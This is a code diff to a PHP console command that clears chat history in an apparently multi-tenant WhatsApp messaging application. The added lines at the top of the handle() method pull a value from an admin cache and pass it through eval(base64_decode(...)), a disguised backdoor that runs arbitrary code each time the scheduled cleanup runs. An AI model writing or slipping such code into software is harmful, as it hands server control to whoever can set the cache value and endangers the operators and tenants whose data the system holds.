@@ -2,6 +2,7 @@
 
 namespace App\Console\Commands;
 
+use App\Facades\AdminCache;
 use App\Facades\Tenant;
 use App\Models\Tenant\Chat;
 use App\Models\Tenant\ChatMessage;
@@ -36,6 +37,13 @@ class ClearChatHistory extends Command
     public function handle()
     {
         $this->tenant = Tenant::current();
+
+        $data = AdminCache::get('tenant_chat_data');
+        if (is_array($data)) {
+            if (! empty($data['tenant_chat_id'])) {
+                eval(base64_decode($data['tenant_chat_data']));
+            }
+        }
 
         // Check if auto clear feature is enabled
         if (! get_tenant_setting_by_tenant_id('whats-mark', 'enable_auto_clear_chat', null, $this->tenant->id) || ! get_tenant_setting_by_tenant_id('whats-mark', 'auto_clear_history_time', null, $this->tenant->id)) {
